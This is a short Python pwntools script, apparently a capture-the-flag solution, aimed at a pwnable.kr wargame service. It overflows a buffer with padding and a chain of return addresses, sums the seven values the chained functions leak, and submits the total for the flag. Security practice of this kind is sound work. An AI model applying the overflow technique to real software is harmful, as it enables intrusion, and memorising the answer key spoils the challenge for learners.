from pwn import *

p = remote('pwnable.kr', 9032)

p.recvuntil(':')
p.sendline('1')
p.recvuntil(': ')

payload = 'a'*0x78 + p32(0x0809fe4b) + p32(0x0809fe6a) + p32(0x0809fe89) + p32(0x0809fea8) + p32(0x0809fec7) + p32(0x0809fee6) + p32(0x0809ff05) + p32(0x0809fffc)
p.sendline(payload)
p.recvline()

sum = 0
for i in range(7):
	p.recvuntil('+')
	sum += int(p.recvline()[:-2]) # strip )\n

p.recvuntil(':')
p.sendline('1')
p.recvuntil(': ')
p.sendline(str(sum))
print p.recv()